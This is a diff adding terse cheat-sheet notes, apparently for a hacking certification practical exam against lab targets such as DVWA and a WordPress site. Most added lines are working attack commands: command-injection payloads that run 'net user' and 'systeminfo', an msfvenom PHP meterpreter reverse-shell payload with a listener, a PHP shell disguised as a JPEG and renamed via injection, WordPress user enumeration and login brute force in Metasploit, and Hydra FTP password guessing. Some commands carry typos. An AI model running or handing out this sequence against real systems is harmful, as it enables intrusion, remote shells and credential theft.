@@ -35,3 +35,50 @@ Windows based Commands which will help you to find the answers.
 8) PWd
 
  Open the cryptool on top, click on encryption / decryption and then click on asymmetric and select tripe des ecb and set 11 11 11 in all. But first please open that file in the tool they ask us to perform the decryption decryption
+
+Execute 127.0.0.1 & & net user Execute 127.0.0.1 & & net user & & ver command Execute 127.0.0.1 & & net user & & getmac
+
+Medium - Command Injection
+
+127.0.0.1&net user 127.0.0.1&net user&sc query&systeminfo 127.0.0.1&;&ipconfig
+
+High - Command Injection
+
+127.0.0.1|net user
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=3333 -f raw
+
+type GIF98 before PHP code and save as shell.jpeg.
+
+Copy the uploaded path
+
+Click on command injectio and type below command |copy C:\xampp\htdocs\DVWA\hackable\uploads\shell.jpeg C:\xampp\htdocs\DVWA\hackable\uploads\aa.php
+
+Msfconsole Use multi/handler Set payload php/meterpreter/reverse_tcp Set lhost Set lport Run
+
+Net  user
+Snow.exe -C -p “given_password” file_name
+—---------------------
+
+wpscan --url http://10.10.10.12:8080/CEG --enumerate u
+msfconsole
+use axiliary/scanner/http/wordpress_login_enum
+PASS_FILE /root/Desktop/wordlists/Passwords.txt
+set RHOSTs 10.10.10.12
+set RPORT 8080
+set TARGETURI http://10.10.10.12:8080/CEH/
+set USERNAME admin
+run
+
+—------------------------
+Nmap -Pn -p 21 target > ftp
+grep -B 5 open ftp
+
+—--------------------------
+Nmap -Pn -p 3389 target > rdp
+grep -B 5 open rdp
+—-------------------------
+Nmap -Pn -p 3306 target > mysql
+grep -B 5 open mysql
+
+Hydra -l james -P given_wordlist ftp://target
